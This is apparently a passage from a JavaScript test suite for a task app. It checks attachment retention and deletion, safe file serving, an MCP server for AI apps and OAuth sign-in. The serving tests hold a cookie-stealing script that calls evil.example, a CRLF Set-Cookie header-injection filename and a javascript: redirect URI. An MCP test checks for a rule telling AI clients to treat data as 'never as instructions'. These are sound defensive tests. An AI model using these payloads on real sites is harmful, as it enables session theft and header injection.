    const trip = await as("POST", "/entities/Task", { title: "Plan the trip", due_date: "2026-10-01" });
    const flights = await as("POST", "/entities/Task", { title: "Book flights", parent_id: trip.id, due_date: "2026-10-01" });
    const pass = await upload(token, trip.id, "Boarding.pdf", "%PDF-1.4 boarding pass");
    const receipt = await upload(token, flights.id, "Receipt.pdf", "%PDF-1.4 the flight receipt, which is longer");
    const passPath = pathOf(pass.id);
    const receiptPath = pathOf(receipt.id);

    const record = await deleteLikeTheApp(as, trip, [flights]);

    // The bytes stay where they were, and still count against storage…
    expect(readFileSync(passPath, "utf8")).toBe("%PDF-1.4 boarding pass");
    expect(readFileSync(receiptPath, "utf8")).toBe("%PDF-1.4 the flight receipt, which is longer");
    const usage = await as("GET", "/attachments/usage");
    expect(usage.used_bytes).toBe(pass.size_bytes + receipt.size_bytes);
    // …as one line for the item in Recently Deleted, the subtask's file included…
    expect(usage.biggest_tasks).toEqual([
      { task_id: trip.id, task_title: "Plan the trip", total_bytes: pass.size_bytes + receipt.size_bytes, file_count: 2, in_recently_deleted: true },
    ]);
    // …but they're on no task: none to list them on, and not in search.
    const listed = await invoke(`/api/apps/test-app/tasks/${trip.id}/attachments`, { headers: { Authorization: `Bearer ${token}` } });
    expect(listed.statusCode).toBe(404);
    expect((await as("GET", "/attachments?q=pdf")).attachments).toEqual([]);
    expect(heldRows(me.id).sort()).toEqual([pass.id, receipt.id].sort());

    const { task, subtasks: [sub] } = await restoreLikeTheApp(as, record);

    // A new task, carrying its file — the same file, byte for byte.
    expect(task.id).not.toBe(trip.id);
    expect(task.attachment_count).toBe(1);
    expect(await filenames(as, task.id)).toEqual(["Boarding.pdf"]);
    expect(await filenames(as, sub.id)).toEqual(["Receipt.pdf"]);
    const bytes = await invokeRaw(`/api/apps/test-app/attachments/${pass.id}`, { headers: { Authorization: `Bearer ${token}` } });
    expect(bytes.body.toString()).toBe("%PDF-1.4 boarding pass");
    const tasks = await as("GET", "/entities/Task");
    expect(tasks.find((t) => t.id === task.id).attachment_count).toBe(1);
    expect(tasks.find((t) => t.id === sub.id).attachment_count).toBe(1);

    // Nothing is held now, and deleting the record took nothing with it.
    expect(heldRows(me.id)).toEqual([]);
    expect(existsSync(passPath) && existsSync(receiptPath)).toBe(true);
    expect((await as("GET", "/attachments/usage")).biggest_tasks.map((l) => [l.task_title, l.file_count, l.in_recently_deleted])).toEqual([
      ["Book flights", 1, false],
      ["Plan the trip", 1, false],
    ]);
    expect((await as("GET", "/attachments?q=pdf")).attachments.map((a) => a.task_title).sort()).toEqual(["Book flights", "Plan the trip"]);
  });

  it("deleting it from Recently Deleted removes its files for good — its own, and no one else's", async () => {
    const token = await login("held-permanent@example.com");
    const as = api(token);
    const oldPlan = await as("POST", "/entities/Task", { title: "Old plan", due_date: "2026-10-01" });
    const otherPlan = await as("POST", "/entities/Task", { title: "Other plan", due_date: "2026-10-01" });
    const live = await as("POST", "/entities/Task", { title: "Live plan", due_date: "2026-10-01" });
    const oldFile = await upload(token, oldPlan.id, "old.pdf", "old");
    const otherFile = await upload(token, otherPlan.id, "other.pdf", "other");
    const liveFile = await upload(token, live.id, "live.pdf", "live");
    const oldPath = pathOf(oldFile.id);
    const oldRecord = await deleteLikeTheApp(as, oldPlan);
    const otherRecord = await deleteLikeTheApp(as, otherPlan);

    await as("DELETE", `/entities/DeletedTask/${oldRecord.id}`);

    expect(existsSync(oldPath)).toBe(false);
    // Its folder goes with it once empty.
    expect(existsSync(dirname(oldPath))).toBe(false);
    expect(db.prepare("SELECT COUNT(*) n FROM task_attachments WHERE id = ?").get(oldFile.id).n).toBe(0);
    expect((await as("GET", "/attachments/usage")).used_bytes).toBe(otherFile.size_bytes + liveFile.size_bytes);
    expect(await filenames(as, live.id)).toEqual(["live.pdf"]);

    // The other one still comes back with its file.
    const { task } = await restoreLikeTheApp(as, otherRecord);
    expect(await filenames(as, task.id)).toEqual(["other.pdf"]);
  });

  it("they go when the item's time in Recently Deleted runs out, whenever that's set to — even if no one opens it", async () => {
    const token = await login("held-expiry@example.com");
    const as = api(token);
    const expiring = await as("POST", "/entities/Task", { title: "Expiring", due_date: "2026-10-01" });
    const keptLong = await as("POST", "/entities/Task", { title: "Kept a year", due_date: "2026-10-01" });
    const expiringFile = await upload(token, expiring.id, "expiring.pdf", "expiring");
    const keptFile = await upload(token, keptLong.id, "kept.pdf", "kept");
    const expiringPath = pathOf(expiringFile.id);
    const keptPath = pathOf(keptFile.id);
    const expiringRecord = await deleteLikeTheApp(as, expiring);
    const keptRecord = await deleteLikeTheApp(as, keptLong);

    // The item's own expiry decides, not how long its files have been held:
    // one deleted two days ago ran out yesterday (inside the server's 7-day
    // window), the other was deleted a month ago but is kept for a year.
    const ago = (days) => new Date(Date.now() - days * DAY).toISOString();
    db.prepare("UPDATE task_attachments SET task_deleted_at = ? WHERE id = ?").run(ago(2), expiringFile.id);
    db.prepare("UPDATE deleted_tasks SET deleted_at = ?, expires_at = ? WHERE id = ?").run(ago(2), ago(1), expiringRecord.id);
    db.prepare("UPDATE task_attachments SET task_deleted_at = ? WHERE id = ?").run(ago(30), keptFile.id);
    db.prepare("UPDATE deleted_tasks SET deleted_at = ?, expires_at = ? WHERE id = ?").run(ago(30), ago(-335), keptRecord.id);

    // The health check (every 30s in production) runs the timer.
    expect((await health()).statusCode).toBe(200);

    expect(existsSync(expiringPath)).toBe(false);
    expect(db.prepare("SELECT COUNT(*) n FROM task_attachments WHERE id = ?").get(expiringFile.id).n).toBe(0);
    expect(readFileSync(keptPath, "utf8")).toBe("kept");
    expect((await as("GET", "/entities/DeletedTask")).map((r) => r.title)).toEqual(["Kept a year"]);
    const { task } = await restoreLikeTheApp(as, keptRecord);
    expect(await filenames(as, task.id)).toEqual(["kept.pdf"]);
  });

  it("a subtask deleted on its own keeps its files for its Undo, until the retention window has passed", async () => {
    const token = await login("held-subtask@example.com");
    const as = api(token);
    const me = await as("GET", "/entities/User/me");
    const parent = await as("POST", "/entities/Task", { title: "Move house", due_date: "2026-10-01" });
    const lease = await as("POST", "/entities/Task", { title: "Sign lease", parent_id: parent.id });
    const quotes = await as("POST", "/entities/Task", { title: "Get quotes", parent_id: parent.id });
    const leaseFile = await upload(token, lease.id, "lease.pdf", "lease");
    const quotesFile = await upload(token, quotes.id, "quotes.pdf", "quotes");
    const quotesPath = pathOf(quotesFile.id);

    // Undo right after (useDeleteWithUndo): the subtask comes back with its file.
    await as("DELETE", `/entities/Task/${lease.id}`);
    expect(heldRows(me.id)).toEqual([leaseFile.id]);
    const leaseBack = await as("POST", "/entities/Task", { title: "Sign lease", parent_id: parent.id, restores_task_id: lease.id });
    expect(await filenames(as, leaseBack.id)).toEqual(["lease.pdf"]);

    // No Undo: held for the retention window, then gone.
    await as("DELETE", `/entities/Task/${quotes.id}`);
    await health();
    expect(existsSync(quotesPath)).toBe(true);
    db.prepare("UPDATE task_attachments SET task_deleted_at = ? WHERE id = ?").run(new Date(Date.now() - 8 * DAY).toISOString(), quotesFile.id);
    await health();
    expect(existsSync(quotesPath)).toBe(false);
    expect(heldRows(me.id)).toEqual([]);
    expect(await filenames(as, leaseBack.id)).toEqual(["lease.pdf"]);
  });

  it("a restore only ever brings back the person's own files", async () => {
    const ownerToken = await login("held-owner@example.com");
    const owner = api(ownerToken);
    const task = await owner("POST", "/entities/Task", { title: "Private", due_date: "2026-10-01" });
    await upload(ownerToken, task.id, "private.pdf", "private");
    const record = await deleteLikeTheApp(owner, task);

    const intruder = api(await login("held-intruder@example.com"));
    const theirs = await intruder("POST", "/entities/Task", { title: "Grab it", due_date: "2026-10-01", restores_task_id: task.id });
    expect(theirs.attachment_count).toBeUndefined();
    expect(await filenames(intruder, theirs.id)).toEqual([]);
    // Nor can the intruder's Recently Deleted let go of the owner's files.
    const decoy = await intruder("POST", "/entities/DeletedTask", { task_id: task.id, title: "Decoy" });
    await intruder("DELETE", `/entities/DeletedTask/${decoy.id}`);

    const { task: back } = await restoreLikeTheApp(owner, record);
    expect(await filenames(owner, back.id)).toEqual(["private.pdf"]);
  });
});

describe("serving attachments", () => {
  const BOUNDARY = "----zephyrly-attachment-boundary";
  let token = "";
  let taskId = "";

  beforeAll(async () => {
    token = await login("attachment-serving@example.com");
    const task = await invoke("/api/apps/test-app/entities/Task", {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body: { title: "Has files", due_date: "2026-10-01" },
    });
    taskId = task.body.id;
  });

  /** Upload as a browser would, with the type the browser claims. */
  const upload = async (filename, mimeType, bytes, onTask = taskId) => {
    const result = await invoke(`/api/apps/test-app/tasks/${onTask}/attachments`, {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": `multipart/form-data; boundary=${BOUNDARY}` },
      body: Buffer.concat([
        Buffer.from(
          `--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: ${mimeType}\r\n\r\n`
        ),
        Buffer.from(bytes),
        Buffer.from(`\r\n--${BOUNDARY}--\r\n`),
      ]),
    });
    expect(result.statusCode).toBe(201);
    return result.body;
  };
  const open = (id, query = "") =>
    invokeRaw(`/api/apps/test-app/attachments/${id}${query}`, { headers: { Authorization: `Bearer ${token}` } });
  const script = "<script>fetch('https://evil.example/?c=' + document.cookie)</script>";

  it("serves HTML as a download of opaque bytes, never as a page", async () => {
    for (const [filename, type] of [
      ["page.html", "text/html"],
      ["page.htm", "TEXT/HTML; charset=utf-8"],
      ["page.xhtml", "application/xhtml+xml"],
    ]) {
      const html = `<!doctype html><h1>Hi</h1>${script}`;
      const { id } = await upload(filename, type, html);
      const served = await open(id);
      expect(served.statusCode).toBe(200);
      expect(served.headers["Content-Type"]).toBe("application/octet-stream");
      expect(served.headers["Content-Disposition"]).toBe(`attachment; filename="${filename}"; filename*=UTF-8''${filename}`);
      expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
      expect(served.headers["Content-Security-Policy"]).toMatch(/^sandbox; default-src 'none'/);
      expect(served.body.toString()).toBe(html);
    }
  });

  it("doesn't serve an SVG inline as image/svg+xml, or count it as an image", async () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg">${script}</svg>`;
    const created = await upload("logo.svg", "image/svg+xml", svg);
    expect(created).toMatchObject({ is_image: false, has_thumb: false });

    for (const query of ["", "?thumb=1"]) {
      const served = await open(created.id, query);
      expect(served.headers["Content-Type"]).toBe("application/octet-stream");
      expect(served.headers["Content-Disposition"]).toMatch(/^attachment;/);
      expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
    }

    // One uploaded before SVGs stopped counting as images: stored as an
    // image, but the chip mustn't try to preview it.
    db.prepare("UPDATE task_attachments SET is_image = 1 WHERE id = ?").run(created.id);
    const listed = await invoke(`/api/apps/test-app/tasks/${taskId}/attachments`, {
      headers: { Authorization: `Bearer ${token}` },
    });
    expect(listed.body.attachments.find((a) => a.id === created.id).is_image).toBe(false);
  });

  it("still previews images and PDFs in place, locked down", async () => {
    const sharp = (await import("sharp")).default;
    const png = await sharp({ create: { width: 800, height: 600, channels: 3, background: "#3366ff" } }).png().toBuffer();
    const photo = await upload("photo.png", "image/png", png);
    expect(photo).toMatchObject({ is_image: true, has_thumb: true });
    const pdf = await upload("Boarding.pdf", "application/pdf", "%PDF-1.4 boarding pass");

    for (const [id, query, type] of [
      [photo.id, "", "image/png"],
      [photo.id, "?thumb=1", "image/webp"],
      [pdf.id, "", "application/pdf"],
    ]) {
      const served = await open(id, query);
      expect(served.statusCode).toBe(200);
      expect(served.headers["Content-Type"]).toBe(type);
      expect(served.headers["Content-Disposition"]).toMatch(/^inline;/);
      expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
      expect(served.headers["Content-Security-Policy"]).toBe(
        "sandbox; default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'"
      );
    }
    expect((await open(photo.id)).body.equals(png)).toBe(true);

    // The download button still asks for a download, and keeps the real type.
    const download = await open(pdf.id, "?download=1");
    expect(download.headers["Content-Type"]).toBe("application/pdf");
    expect(download.headers["Content-Disposition"]).toBe(`attachment; filename="Boarding.pdf"; filename*=UTF-8''Boarding.pdf`);
  });

  it("plays audio and video in place, without a sandbox their player can't sign in from", async () => {
    const memo = await upload("memo.m4a", "audio/x-m4a", "not really audio");
    const served = await open(memo.id);
    expect(served.headers["Content-Type"]).toBe("audio/x-m4a");
    expect(served.headers["Content-Disposition"]).toMatch(/^inline;/);
    expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
    const csp = served.headers["Content-Security-Policy"];
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("media-src 'self'");
    expect(csp).not.toContain("sandbox");
  });

  it("holds a file to the safe type it claimed, so a page can't pass as an image", async () => {
    const { id } = await upload("cat.png", "image/png", `<!doctype html>${script}`);
    const served = await open(id);
    expect(served.headers["Content-Type"]).toBe("image/png");
    expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
    expect(served.headers["Content-Security-Policy"]).toMatch(/^sandbox;/);
  });

  /**
   * The Content-Disposition a file is served with, checked the way Node's
   * real response checks it (this mock response doesn't): anything past
   * U+00FF, or a line break, throws ERR_INVALID_CHAR and fails the request.
   */
  const dispositionOf = async (id, query = "") => {
    const served = await open(id, query);
    expect(served.statusCode).toBe(200);
    const header = String(served.headers["Content-Disposition"]);
    expect(() => validateHeaderValue("Content-Disposition", header)).not.toThrow();
    expect(header).toMatch(/^[\x20-\x7e]+$/);
    const match = /^(inline|attachment); filename="([^"]*)"; filename\*=UTF-8''([A-Za-z0-9!#$&+.^_`|~%-]+)$/.exec(header);
    expect(match, header).not.toBeNull();
    return { type: match[1], fallback: match[2], name: decodeURIComponent(match[3]) };
  };
  // Each of these tests has its own task: one task holds at most 10 files.
  const newTask = async () =>
    (await invoke("/api/apps/test-app/entities/Task", {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body: { title: "Files with names", due_date: "2026-10-01" },
    })).body.id;
  const listedName = async (onTask, id) =>
    (await invoke(`/api/apps/test-app/tasks/${onTask}/attachments`, { headers: { Authorization: `Bearer ${token}` } })).body.attachments.find(
      (a) => a.id === id
    )?.filename;
  // What the upload parser used to store: the browser's UTF-8 bytes read as latin1.
  const asMojibake = (name) => Buffer.from(name, "utf8").toString("latin1");

  it("keeps a file's real name when it isn't plain ASCII, from upload to download", async () => {
    const task = await newTask();
    // A browser sends the name as raw UTF-8 bytes (the helper's Buffer.from).
    const resume = await upload("Résumé 日本.pdf", "application/pdf", "%PDF-1.4 résumé", task);
    expect(resume.filename).toBe("Résumé 日本.pdf");
    expect(await listedName(task, resume.id)).toBe("Résumé 日本.pdf");
    expect(await dispositionOf(resume.id)).toEqual({ type: "inline", fallback: "Resume __.pdf", name: "Résumé 日本.pdf" });
    expect(await dispositionOf(resume.id, "?download=1")).toMatchObject({ type: "attachment", name: "Résumé 日本.pdf" });

    // macOS screenshots have a narrow no-break space before AM/PM.
    const shotName = "Screenshot 2026-09-28 at 9.41.00\u202fAM.png";
    const shot = await upload(shotName, "image/png", "not really a png", task);
    expect(await listedName(task, shot.id)).toBe(shotName);
    expect(await dispositionOf(shot.id)).toEqual({
      type: "inline",
      fallback: "Screenshot 2026-09-28 at 9.41.00 AM.png",
      name: shotName,
    });

    // Types that only download keep their name too.
    const page = await upload("Café menu 🍝.html", "text/html", "<!doctype html>", task);
    expect(await dispositionOf(page.id)).toEqual({ type: "attachment", fallback: "Cafe menu _.html", name: "Café menu 🍝.html" });
  });

  it("serves a stored name that would break the header as a safe one", async () => {
    const { id } = await upload("placeholder.txt", "text/plain", "hello", await newTask());
    for (const [stored, expected] of [
      // Line breaks and quotes can't split the header or end the quoted name.
      ['Q3 "final"\r\nSet-Cookie: x=1.txt', "Q3 finalSet-Cookie: x=1.txt"],
      // Half of an emoji (a name cut short at 255 characters can end in one).
      ["notes \ud83d.txt", "notes \ufffd.txt"],
      ["", "file"],
    ]) {
      db.prepare("UPDATE task_attachments SET filename = ? WHERE id = ?").run(stored, id);
      expect((await dispositionOf(id)).name).toBe(expected);
    }
  });

  it("repairs names stored before uploads were read as UTF-8, once, at boot", async () => {
    const names = {
      resume: "Résumé 日本.pdf",
      shot: "Screenshot 2026-09-28 at 9.41.00\u202fAM.png",
      emoji: "Trip 🏔️ plan.txt",
      // Correct already, and must stay exactly as they are.
      german: "Größe.txt",
      japanese: "日本.txt",
      plain: "plain.txt",
      // Only latin1 characters, but not UTF-8 read as latin1 ("Ã" then "©" is).
      lookalike: "Ã tête.txt",
    };
    const task = await newTask();
    const ids = {};
    for (const [key, name] of Object.entries(names)) {
      ids[key] = (await upload(`${key}.txt`, "text/plain", key, task)).id;
      db.prepare("UPDATE task_attachments SET filename = ? WHERE id = ?").run(name, ids[key]);
    }
    // The broken state, as the old parser left it.
    for (const key of ["resume", "shot", "emoji"]) {
      db.prepare("UPDATE task_attachments SET filename = ? WHERE id = ?").run(asMojibake(names[key]), ids[key]);
    }
    expect(await listedName(task, ids.resume)).toBe("RÃ©sumÃ© æ\u0097¥æ\u009c¬.pdf");

    const boot = () => createDatabase(config).close();
    boot();
    for (const [key, name] of Object.entries(names)) expect(await listedName(task, ids[key])).toBe(name);
    expect(await dispositionOf(ids.resume)).toMatchObject({ name: names.resume });

    // A later boot changes nothing.
    boot();
    for (const [key, name] of Object.entries(names)) expect(await listedName(task, ids[key])).toBe(name);
  });
});

describe("AI apps over MCP", () => {
  const today = () => new Intl.DateTimeFormat("en-CA", { timeZone: "America/New_York" }).format(new Date());
  const as = (token) => async (method, path, body) =>
    invoke(`/api/apps/test-app${path}`, {
      method,
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body,
    });
  /** A personal token made through Settings, as the person would. */
  const makeToken = async (session, { canWrite = false, label = "Claude Code" } = {}) => {
    const created = await as(session)("POST", "/ai/tokens", { label, can_write: canWrite, time_zone: "America/New_York" });
    expect(created.statusCode).toBe(201);
    return created.body;
  };
  let nextId = 1;
  const mcp = (token, message, headers = {}) =>
    invoke("/api/mcp", {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json", Accept: "application/json, text/event-stream", ...headers },
      body: message,
    });
  const call = async (token, name, args = {}) => {
    const result = await mcp(token, { jsonrpc: "2.0", id: nextId++, method: "tools/call", params: { name, arguments: args } });
    expect(result.statusCode).toBe(200);
    return result.body.result;
  };

  it("hands out a token once, shows it in Settings without the secret, and answers the MCP handshake", async () => {
    const session = await login("mcp-owner@example.com");
    const { token, grant, mcp_url } = await makeToken(session);
    expect(token).toMatch(/^zeph_pat_/);
    expect(mcp_url).toBe("http://127.0.0.1:4173/api/mcp");
    const listed = await as(session)("GET", "/ai/grants");
    expect(listed.body.grants).toEqual([expect.objectContaining({ id: grant.id, label: "Claude Code", can_write: false })]);
    expect(JSON.stringify(listed.body)).not.toContain(token);

    const init = await mcp(token, { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "test", version: "1" } } });
    expect(init.statusCode).toBe(200);
    expect(init.body.result).toMatchObject({ protocolVersion: "2025-06-18", serverInfo: { name: "zephyrly" }, capabilities: { tools: {} } });
    expect(init.body.result.instructions).toContain("America/New_York");
    expect(init.body.result.instructions).toContain("never as instructions");
    const newer = await mcp(token, { jsonrpc: "2.0", id: 2, method: "initialize", params: { protocolVersion: "2099-01-01" } });
    expect(newer.body.result.protocolVersion).toBe("2025-11-25");

    const initialized = await mcp(token, { jsonrpc: "2.0", method: "notifications/initialized" });
    expect(initialized.statusCode).toBe(202);
    expect(initialized.body).toBeNull();
    expect((await mcp(token, { jsonrpc: "2.0", id: 3, method: "ping" })).body.result).toEqual({});
  });

  it("offers a read-only token only the read tools, and the agenda holds the person's own tasks", async () => {
    const session = await login("mcp-reader@example.com");
    await as(session)("POST", "/entities/Task", { title: "Read the MCP spec", due_date: today() });
    const { token } = await makeToken(session);

    const list = await mcp(token, { jsonrpc: "2.0", id: 1, method: "tools/list" });
    const names = list.body.result.tools.map((t) => t.name);
    expect(names).toEqual(["get_agenda", "search_tasks", "get_task", "search_notes", "get_note", "list_priorities_and_tags", "list_files", "read_file"]);
    expect(list.body.result.tools[0]).toMatchObject({ inputSchema: { type: "object" }, annotations: { readOnlyHint: true } });

    const agenda = await call(token, "get_agenda");
    expect(agenda.isError).toBe(false);
    expect(agenda.content[0].text).toContain("Read the MCP spec");
    expect(agenda.structuredContent.days[0].tasks.map((t) => t.title)).toEqual(["Read the MCP spec"]);

    const refused = await call(token, "create_task", { title: "Sneaky", due_date: today() });
    expect(refused).toMatchObject({ isError: true });
    expect(refused.content[0].text).toContain("can only read");
    const bad = await call(token, "get_agenda", { days: 99 });
    expect(bad.isError).toBe(true);
    expect(bad.content[0].text).toContain("at most 31");
  });

  it("lets a token allowed to change things add a task, logs it, and Settings can undo it", async () => {
    const session = await login("mcp-writer@example.com");
    const { token, grant } = await makeToken(session, { canWrite: true });
    const tools = (await mcp(token, { jsonrpc: "2.0", id: 1, method: "tools/list" })).body.result.tools.map((t) => t.name);
    expect(tools).toContain("create_task");

    const added = await call(token, "create_task", { title: "Book dentist", due_date: today(), time: "9am" });
    expect(added.isError).toBe(false);
    const id = added.structuredContent.id;
    const task = (await as(session)("GET", `/entities/Task/${id}`)).body;
    expect(task).toMatchObject({ title: "Book dentist", task_time: "9:00AM", task_end_time: "10:00AM" });

    const log = (await as(session)("GET", "/ai/activity")).body.activity;
    expect(log[0]).toMatchObject({ app: "Claude Code", tool: "create_task", undo: "available" });
    const undone = await as(session)("POST", `/ai/activity/${log[0].id}/undo`);
    expect(undone.body.undo).toBe("undone");
    expect((await as(session)("GET", `/entities/Task/${id}`)).statusCode).toBe(404);

    // Access is read on every request: switching it off takes effect at once.
    await as(session)("PUT", `/ai/grants/${grant.id}`, { can_write: false });
    expect((await call(token, "create_task", { title: "Again", due_date: today() })).isError).toBe(true);
  });

  it("keeps AI tokens and sign-in sessions apart", async () => {
    const session = await login("mcp-apart@example.com");
    const { token } = await makeToken(session);
    // An AI token can't use the app's own API…
    expect((await invoke("/api/apps/test-app/entities/Task", { headers: { Authorization: `Bearer ${token}` } })).statusCode).toBe(401);
    expect((await as(token)("GET", "/ai/grants")).statusCode).toBe(401);
    // …and a session can't use MCP.
    const withSession = await mcp(session, { jsonrpc: "2.0", id: 1, method: "tools/list" });
    expect(withSession.statusCode).toBe(401);
    expect(withSession.headers["WWW-Authenticate"]).toMatch(/^Bearer /);
    expect((await mcp("", { jsonrpc: "2.0", id: 1, method: "tools/list" })).statusCode).toBe(401);
  });

  it("stops a revoked token at once", async () => {
    const session = await login("mcp-revoke@example.com");
    const { token, grant } = await makeToken(session);
    expect((await mcp(token, { jsonrpc: "2.0", id: 1, method: "ping" })).statusCode).toBe(200);
    expect((await as(session)("DELETE", `/ai/grants/${grant.id}`)).statusCode).toBe(200);
    expect((await mcp(token, { jsonrpc: "2.0", id: 2, method: "ping" })).statusCode).toBe(401);
    expect((await as(session)("GET", "/ai/grants")).body.grants).toEqual([]);
  });

  it("never shows one person's tasks to another's token", async () => {
    const owner = await login("mcp-private@example.com");
    const secret = (await as(owner)("POST", "/entities/Task", { title: "Private plan", due_date: today() })).body;
    const other = await login("mcp-snoop@example.com");
    const { token } = await makeToken(other, { canWrite: true });
    expect((await call(token, "get_agenda")).content[0].text).not.toContain("Private plan");
    const peek = await call(token, "get_task", { task_id: secret.id });
    expect(peek).toMatchObject({ isError: true, content: [{ text: `No task with id "${secret.id}".` }] });
    expect((await call(token, "update_task", { task_id: secret.id, title: "Mine now" })).isError).toBe(true);
    expect((await as(owner)("GET", `/entities/Task/${secret.id}`)).body.title).toBe("Private plan");
  });

  it("refuses web pages, other verbs, unknown protocol versions and malformed messages", async () => {
    const session = await login("mcp-protocol@example.com");
    const { token } = await makeToken(session);
    const ping = { jsonrpc: "2.0", id: 1, method: "ping" };
    expect((await mcp(token, ping, { Origin: "https://evil.example" })).statusCode).toBe(403);
    expect((await mcp(token, ping, { Origin: "http://127.0.0.1:4173" })).statusCode).toBe(200);
    expect((await mcp(token, ping, { "MCP-Protocol-Version": "1999-01-01" })).statusCode).toBe(400);
    expect((await mcp(token, ping, { "MCP-Protocol-Version": "2025-06-18" })).statusCode).toBe(200);

    const get = await invoke("/api/mcp", { headers: { Authorization: `Bearer ${token}` } });
    expect(get.statusCode).toBe(405);
    expect(get.headers.Allow).toBe("POST");

    const parse = await invoke("/api/mcp", { method: "POST", headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" }, body: "{not json" });
    expect(parse.statusCode).toBe(400);
    expect(parse.body.error.code).toBe(-32700);
    const unknown = await mcp(token, { jsonrpc: "2.0", id: 9, method: "resources/list" });
    expect(unknown.body).toMatchObject({ id: 9, error: { code: -32601 } });
    const batch = await mcp(token, [ping, { jsonrpc: "2.0", method: "notifications/initialized" }, { jsonrpc: "2.0", id: 2, method: "ping" }]);
    expect(batch.body.map((r) => r.id)).toEqual([1, 2]);
  });

  it("slows a connection down past 120 requests a minute", async () => {
    const session = await login("mcp-busy@example.com");
    const { token } = await makeToken(session);
    const ping = (id) => mcp(token, { jsonrpc: "2.0", id, method: "ping" });
    for (let i = 0; i < 120; i += 1) expect((await ping(i)).statusCode).toBe(200);
    const limited = await ping(121);
    expect(limited.statusCode).toBe(429);
    expect(Number(limited.headers["Retry-After"])).toBeGreaterThan(0);
  });
});

describe("Sign in with Zephyrly (OAuth for AI apps)", () => {
  const BASE = "http://127.0.0.1:4173";
  const CALLBACK = "https://claude.ai/api/mcp/auth_callback";
  const pkce = () => {
    const verifier = randomBytes(32).toString("base64url");
    return { verifier, challenge: createHash("sha256").update(verifier).digest("base64url") };
  };
  const session = (token) => async (method, path, body) =>
    invoke(`/api/apps/test-app${path}`, { method, headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" }, body });
  const form = (path, fields) =>
    invoke(path, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(fields).toString() });
  const register = (body) => invoke("/api/oauth/register", { method: "POST", headers: { "Content-Type": "application/json" }, body });
  const authorize = (params) => invokeRaw(`/api/oauth/authorize?${new URLSearchParams(params)}`);
  const mcpList = (token) =>
    invoke("/api/mcp", { method: "POST", headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" }, body: { jsonrpc: "2.0", id: 1, method: "tools/list" } });

  /** Register, authorize and consent the way claude.ai would; returns the code and what's needed to trade it. */
  async function signIn(email, { canWrite = false, scope = "tasks.read tasks.write", name = "Claude" } = {}) {
    const person = await login(email);
    const client = (await register({ client_name: name, redirect_uris: [CALLBACK], token_endpoint_auth_method: "client_secret_post" })).body;
    const { verifier, challenge } = pkce();
    const started = await authorize({
      response_type: "code", client_id: client.client_id, redirect_uri: CALLBACK, code_challenge: challenge,
      code_challenge_method: "S256", state: "st-123", scope, resource: `${BASE}/api/mcp`,
    });
    expect(started.statusCode).toBe(302);
    const requestId = /\/connect\/([^/?]+)$/.exec(String(started.headers.Location))[1];
    const decided = await session(person)("POST", `/ai/connect/${requestId}`, { approve: true, can_write: canWrite, time_zone: "Europe/London" });
    expect(decided.statusCode).toBe(200);
    const back = new URL(decided.body.redirect_to);
    return { person, client, verifier, requestId, code: back.searchParams.get("code"), back };
  }
  const trade = (s, overrides = {}) =>
    form("/api/oauth/token", { grant_type: "authorization_code", code: s.code, code_verifier: s.verifier, client_id: s.client.client_id, redirect_uri: CALLBACK, resource: `${BASE}/api/mcp`, ...overrides });

  beforeEach(() => resetRateLimits());

  it("publishes where to sign in, and /api/mcp points there when there's no token", async () => {
    for (const path of ["/.well-known/oauth-protected-resource", "/.well-known/oauth-protected-resource/api/mcp"]) {
      const doc = await invoke(path);
      expect(doc.body).toMatchObject({ resource: `${BASE}/api/mcp`, authorization_servers: [BASE] });
    }
    const as = (await invoke("/.well-known/oauth-authorization-server")).body;
    expect(as).toMatchObject({
      issuer: BASE,
      authorization_endpoint: `${BASE}/api/oauth/authorize`,
      token_endpoint: `${BASE}/api/oauth/token`,
      registration_endpoint: `${BASE}/api/oauth/register`,
      code_challenge_methods_supported: ["S256"],
      token_endpoint_auth_methods_supported: ["none"],
    });
    // Anything else under /.well-known is a plain 404, never the app's HTML.
    expect((await invoke("/.well-known/openid-configuration")).statusCode).toBe(404);
    const noToken = await invoke("/api/mcp", { method: "POST", headers: { "Content-Type": "application/json" }, body: { jsonrpc: "2.0", id: 1, method: "ping" } });
    expect(noToken.headers["WWW-Authenticate"]).toBe(`Bearer resource_metadata="${BASE}/.well-known/oauth-protected-resource", scope="tasks.read"`);
  });

  it("registers apps with https or loopback return addresses only, and never hands out a secret", async () => {
    const ok = await register({ client_name: "Claude\u0007", redirect_uris: [CALLBACK, "http://127.0.0.1:33418/callback"] });
    expect(ok.statusCode).toBe(201);
    expect(ok.body).toMatchObject({ client_name: "Claude", token_endpoint_auth_method: "none" });
    expect(ok.body.client_secret).toBeUndefined();
    for (const bad of ["http://evil.example/cb", "https://claude.ai/cb#x", "javascript:alert(1)", "not a url"]) {
      const refused = await register({ client_name: "x", redirect_uris: [bad] });
      expect(refused.statusCode).toBe(400);
      expect(refused.body.error).toBe("invalid_redirect_uri");
    }
    expect((await register({ redirect_uris: [] })).statusCode).toBe(400);
  });

  it("signs an app in: consent page, code, tokens, and the connection it makes is read-only unless ticked", async () => {
    const s = await signIn("oauth-happy@example.com");
    expect(s.back.origin + s.back.pathname).toBe(CALLBACK);
    expect(s.back.searchParams.get("state")).toBe("st-123");
    expect(s.back.searchParams.get("iss")).toBe(BASE);

    const tokens = await trade(s);
    expect(tokens.statusCode).toBe(200);
    expect(tokens.headers["Cache-Control"]).toBe("no-store");
